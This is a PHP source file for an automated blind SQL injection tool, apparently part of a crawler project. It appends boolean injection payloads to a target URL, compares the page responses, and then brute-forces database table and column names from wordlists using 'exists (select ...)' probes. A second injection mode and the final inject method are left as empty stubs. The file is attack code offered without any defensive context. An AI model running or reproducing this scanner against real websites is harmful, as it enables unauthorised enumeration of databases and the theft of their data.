<?php
class inject {
	
	
	private $url = '';
	
	private $succ_html = '';
	
	function __construct($url) {
		$this->url = $url;
	}
	
	
	private function _load_tables($file){
		$array = file_get_contents(ROOT_PATH.'data/'.$file.'.txt');
		$array = str_replace("\r", "", $array);
		$array = explode("\n", $array);
		return $array;
	}
	
	public function check($url){
		$check_array = array(
			array(
				'true' => " or 1=1",
				'false' => ' and 1=2',
				'mode' => 0,
			),
			array(
				'true' => "' or ''='",
				'false' => "' and 1=''",
				'mode' => 1,
			),
		);
		foreach($check_array as $k=>$v){
			$res = $this->_check($v['true'], $v['false']);
			if($res){
				$tables = $this->_load_tables('tables');
				$fields = $this->_load_tables('table_fields');
				$exist_tables = array();
				$exist_fields = array();
				switch($v['mode']){
					case 0:
						foreach($tables as $table){
							$html = $this->_get(' and exists (select * from ['.$table.'])');
							if($html == $this->succ_html){
								$exist_tables[] = $table;
							}
						}
						foreach($exist_tables as $table){
							foreach($fields as $field){
								$html = $this->_get(' and exists (select ['.$field.'] from ['.$table.'])');
								if($html == $this->succ_html){
									$exist_fields[$table][] = $field;
								}
							}
						}
						
						//'15 and (select Count(1) from [admin] where 1=1) between 0 and 16';
						
					break;
					case 1:
					break;
				}
				break;
			}
		}
	}
	
	private function _get($param){
		$url = $this->url.rawurlencode($param);
		return spider::fetch_url($url);
	}
	
	
	private function _check($param1, $param2){
		$html1 = $this->_get($param1);
		$html2 = $this->_get($param2);
		if($html1 != $html2){
			$this->succ_html = $html1;
			return true;
		}
		return false;
	}
	
	private function inject($url, $table){
	}
}

?>